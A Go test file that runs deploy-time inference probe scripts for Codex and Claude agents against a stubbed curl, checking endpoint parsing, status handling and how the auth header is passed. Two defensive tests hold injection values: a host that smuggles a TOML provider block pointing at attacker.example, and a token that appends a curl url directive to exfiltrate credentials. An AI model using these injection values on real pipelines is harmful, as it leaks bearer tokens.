package deployflow

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/IceRhymers/buzz-lakebox/internal/nest"
	"github.com/IceRhymers/buzz-lakebox/internal/payload"
)

// These run the codex probe script through a real shell with a stubbed
// curl, mirroring claude_exec_test.go. They matter more than the claude
// ones because of what is unique to this probe: it does not receive its
// endpoint, it PARSES it back out of the config.toml that
// nest.CodexEnvSnippet generated. Every unit assertion on that parse is
// some form of `strings.Contains(script, "base_url")`, which passes just as
// happily against an inverted or broken sed.
//
// So these drive the probe with the output of the real RenderEnv rather
// than a hand-written env fixture: if the snippet and the probe ever
// disagree about where the config lives or how base_url is spelled, that is
// precisely the "the probe and the agent cannot disagree" guarantee
// breaking, and it should break here rather than in production.

// codexProbeEnv renders a real codex env for the given host, exactly as a
// deploy would.
func codexProbeEnv(host string) string {
	agent := payload.Agent{
		RelayURL: "wss://r", PrivateKeyNsec: "nsec1x", AuthTag: "t",
		AgentCommand: "codex-acp", Parallelism: 1,
		EnvVars: map[string]string{},
	}
	if host != "" {
		agent.EnvVars["DATABRICKS_HOST"] = host
		agent.EnvVars["DATABRICKS_TOKEN"] = "dapi-test"
	}
	return nest.RenderEnv(agent, payload.RuntimeCodex, false)
}

// runCodexProbe executes the probe with a curl stub that records the URL it
// was asked for and returns the given status.
func runCodexProbe(t *testing.T, env, status string) (stdout string, failed bool, calledURL string) {
	t.Helper()
	requireSh(t)

	home := t.TempDir()
	urlFile := filepath.Join(home, "url.txt")
	stub := filepath.Join(home, "curl")
	// Record the last non-flag argument that looks like a URL, then print
	// the status the real curl would emit via -w '%{http_code}'.
	script := "#!/bin/sh\nfor a in \"$@\"; do case \"$a\" in http*) printf '%s' \"$a\" > " +
		urlFile + " ;; esac; done\nprintf '%s' " + status + "\n"
	if err := os.WriteFile(stub, []byte(script), 0o755); err != nil {
		t.Fatalf("write curl stub: %v", err)
	}

	cmd := exec.Command("sh", "-c", codexInferenceProbeScript())
	cmd.Stdin = strings.NewReader(env)
	cmd.Env = []string{"HOME=" + home, "PATH=" + home + ":" + os.Getenv("PATH")}
	var out, errb bytes.Buffer
	cmd.Stdout, cmd.Stderr = &out, &errb
	err := cmd.Run()

	if b, rerr := os.ReadFile(urlFile); rerr == nil {
		calledURL = string(b)
	}
	return out.String(), err != nil, calledURL
}

// TestCodexInferenceProbe_TargetsTheGeneratedEndpoint is the test the unit
// suite could not provide: it proves the sed actually recovers the URL the
// snippet wrote, rather than merely that the word "base_url" appears in the
// script.
func TestCodexInferenceProbe_TargetsTheGeneratedEndpoint(t *testing.T) {
	for _, tc := range []struct{ host, wantURL string }{
		{"https://ex.databricks.com", "https://ex.databricks.com/ai-gateway/codex/v1/responses"},
		{"ex.databricks.com", "https://ex.databricks.com/ai-gateway/codex/v1/responses"},
		{"https://ex.databricks.com/", "https://ex.databricks.com/ai-gateway/codex/v1/responses"},
		{"http://localhost:8080", "http://localhost:8080/ai-gateway/codex/v1/responses"},
	} {
		t.Run(tc.host, func(t *testing.T) {
			_, failed, url := runCodexProbe(t, codexProbeEnv(tc.host), "200")
			if failed {
				t.Fatalf("HTTP 200 must not fail the deploy")
			}
			if url != tc.wantURL {
				t.Errorf("probe called %q, want %q — the probe and the agent must not disagree about the endpoint", url, tc.wantURL)
			}
		})
	}
}

// TestCodexInferenceProbe_OnlyAuthFailuresFail mirrors the claude matrix.
// Failing on anything but a credential rejection would delete a
// freshly-created sandbox over a model id.
func TestCodexInferenceProbe_OnlyAuthFailuresFail(t *testing.T) {
	for _, tc := range []struct {
		status   string
		wantFail bool
	}{
		{"200", false},
		{"201", false},
		{"400", false}, // model not served here — not a misconfiguration
		{"404", false},
		{"429", false}, // transient
		{"500", false}, // transient
		{"401", true},  // credential refused
		{"403", true},  // credential refused
	} {
		t.Run(tc.status, func(t *testing.T) {
			stdout, failed, _ := runCodexProbe(t, codexProbeEnv("https://ex.databricks.com"), tc.status)
			if failed != tc.wantFail {
				t.Fatalf("HTTP %s: probe failed=%v, want %v (stdout=%q)", tc.status, failed, tc.wantFail, stdout)
			}
			if tc.wantFail {
				if cause := probeCause(stdout, codexProbeCauseMarkerPrefix); cause != "auth" {
					t.Fatalf("HTTP %s should report cause \"auth\", got %q", tc.status, cause)
				}
				if got := probeCause(stdout, "BUZZ_CODEX_PROBE_STATUS="); got != tc.status {
					t.Fatalf("probe should report the real status, got %q", got)
				}
			}
		})
	}
}

// TestCodexInferenceProbe_FailsClosedWithoutConfig is the fail-closed half,
// and it is the path that actually matters in production: when
// CodexEnvSnippet declines to write a config (no derivable host, or a host
// refused by the charset gate), the probe must abort the deploy rather than
// launch an agent that would fall back to the image's ~/.codex symlink and
// its baked workspace credential.
func TestCodexInferenceProbe_FailsClosedWithoutConfig(t *testing.T) {
	// A real rendered env with no DATABRICKS_HOST — the snippet exports
	// CODEX_HOME but writes no config.toml.
	stdout, failed, url := runCodexProbe(t, codexProbeEnv(""), "200")
	if !failed {
		t.Fatal("a probe with no generated config must fail the deploy")
	}
	if cause := probeCause(stdout, codexProbeCauseMarkerPrefix); cause != "unset" {
		t.Fatalf("cause = %q, want \"unset\"", cause)
	}
	if url != "" {
		t.Errorf("the probe must not contact anything when no config was generated, called %q", url)
	}
}

// TestCodexInferenceProbe_HostileHostFailsClosed ties the charset gate to
// the probe: a host the snippet refuses produces no config, so the deploy
// dies as "unset" rather than the probe validating an endpoint that a
// crafted TOML block could otherwise have introduced.
func TestCodexInferenceProbe_HostileHostFailsClosed(t *testing.T) {
	env := codexProbeEnv("https://evil.example\"\n[model_providers.pwn]\nbase_url = \"https://attacker.example/v1\"\n#")
	stdout, failed, url := runCodexProbe(t, env, "200")
	if !failed {
		t.Fatal("a host the snippet refuses must fail the deploy")
	}
	if cause := probeCause(stdout, codexProbeCauseMarkerPrefix); cause != "unset" {
		t.Fatalf("cause = %q, want \"unset\"", cause)
	}
	if strings.Contains(url, "attacker.example") {
		t.Fatalf("the probe must never contact an injected endpoint, called %q", url)
	}
}

// TestInferenceProbes_AuthHeaderActuallyArrives is the execution test the
// shape assertions could not be: every other check on the -K change is a
// strings.Contains on the script text, and the stub curl in the other tests
// ignores its arguments entirely.
//
// A wrong keyword or a missing quote in the config file would ship an
// UNAUTHENTICATED request, which the gateway answers 401 — surfacing as a
// spurious "auth" diagnosis on every deploy of that runtime, pointing the
// operator at a credential that is perfectly fine. Claude has no other exec
// coverage of this path at all.
func TestInferenceProbes_AuthHeaderActuallyArrives(t *testing.T) {
	requireSh(t)

	for _, tc := range []struct{ name, script, env, token string }{
		{"codex", codexInferenceProbeScript(), codexProbeEnv("https://ex.databricks.com"), "dapi-test"},
		{"claude", claudeInferenceProbeScript(),
			"export ANTHROPIC_BASE_URL=https://gw.example/v1\nexport ANTHROPIC_AUTH_TOKEN=dapi-claude-test\n", "dapi-claude-test"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			home := t.TempDir()
			argvFile := filepath.Join(home, "argv.txt")
			hdrFile := filepath.Join(home, "hdr.txt")
			// Record argv, and resolve whatever -K file curl was handed so
			// we can assert the header is really in it.
			stub := "#!/bin/sh\n" +
				"printf '%s\\n' \"$*\" > " + argvFile + "\n" +
				"prev=''\nfor a in \"$@\"; do if [ \"$prev\" = \"-K\" ]; then cat \"$a\" > " + hdrFile + "; fi; prev=\"$a\"; done\n" +
				"printf '%s' 200\n"
			if err := os.WriteFile(filepath.Join(home, "curl"), []byte(stub), 0o755); err != nil {
				t.Fatal(err)
			}

			cmd := exec.Command("sh", "-c", tc.script)
			cmd.Stdin = strings.NewReader(tc.env)
			cmd.Env = []string{"HOME=" + home, "PATH=" + home + ":" + os.Getenv("PATH")}
			if err := cmd.Run(); err != nil {
				t.Fatalf("probe should succeed on HTTP 200: %v", err)
			}

			argv, _ := os.ReadFile(argvFile)
			if strings.Contains(string(argv), tc.token) {
				t.Errorf("token appears in curl argv, readable via /proc: %s", argv)
			}
			hdr, err := os.ReadFile(hdrFile)
			if err != nil {
				t.Fatalf("probe did not hand curl a -K config file: %v", err)
			}
			want := `header = "Authorization: Bearer ` + tc.token + `"`
			if !strings.Contains(string(hdr), want) {
				t.Errorf("config file does not carry the auth header.\n got: %q\nwant: %q", hdr, want)
			}
		})
	}
}

// TestInferenceProbes_HostileTokenFailsClosed pins the charset gate the -K
// change made necessary. curl's config syntax treats a quote-newline as the
// end of one directive and the start of the next, so a token containing one
// can append a url directive — making curl issue a SECOND request that
// replays the Authorization header and the request body to an endpoint of
// the attacker's choosing. Verified against real curl 8.20 before the gate
// was added.
func TestInferenceProbes_HostileTokenFailsClosed(t *testing.T) {
	requireSh(t)
	hostile := "dapi-real\"\nurl = \"http://attacker.example/exfil"

	for _, tc := range []struct{ name, script, env, marker string }{
		{"codex", codexInferenceProbeScript(),
			codexProbeEnv("https://ex.databricks.com"), codexProbeCauseMarkerPrefix},
		{"claude", claudeInferenceProbeScript(),
			"export ANTHROPIC_BASE_URL=https://gw.example/v1\n", claudeProbeCauseMarkerPrefix},
	} {
		t.Run(tc.name, func(t *testing.T) {
			home := t.TempDir()
			if err := os.WriteFile(filepath.Join(home, "curl"), []byte("#!/bin/sh\nprintf '%s' 200\n"), 0o755); err != nil {
				t.Fatal(err)
			}
			// Override the token with the hostile value, after the env.
			env := tc.env
			if tc.name == "codex" {
				env += "export DATABRICKS_TOKEN='" + hostile + "'\n"
			} else {
				env += "export ANTHROPIC_AUTH_TOKEN='" + hostile + "'\n"
			}

			cmd := exec.Command("sh", "-c", tc.script)
			cmd.Stdin = strings.NewReader(env)
			cmd.Env = []string{"HOME=" + home, "PATH=" + home + ":" + os.Getenv("PATH")}
			var out bytes.Buffer
			cmd.Stdout = &out
			if err := cmd.Run(); err == nil {
				t.Fatal("a token that can inject curl config directives must fail the deploy")
			}
			if cause := probeCause(out.String(), tc.marker); cause != "unset" {
				t.Errorf("cause = %q, want \"unset\"", cause)
			}
		})
	}
}
